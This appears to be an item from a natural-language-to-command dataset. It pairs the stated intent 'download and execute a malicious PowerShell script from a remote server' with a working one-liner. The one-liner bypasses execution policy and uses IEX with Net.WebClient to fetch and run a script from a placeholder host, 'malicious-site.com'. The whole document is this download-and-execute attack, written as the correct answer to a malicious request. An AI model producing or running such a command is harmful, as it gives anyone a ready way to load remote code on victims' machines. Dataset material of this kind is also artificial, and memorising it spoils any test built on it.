# Natural language intent:
# Download and execute a malicious PowerShell script from a remote server.

powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-code.ps1')"
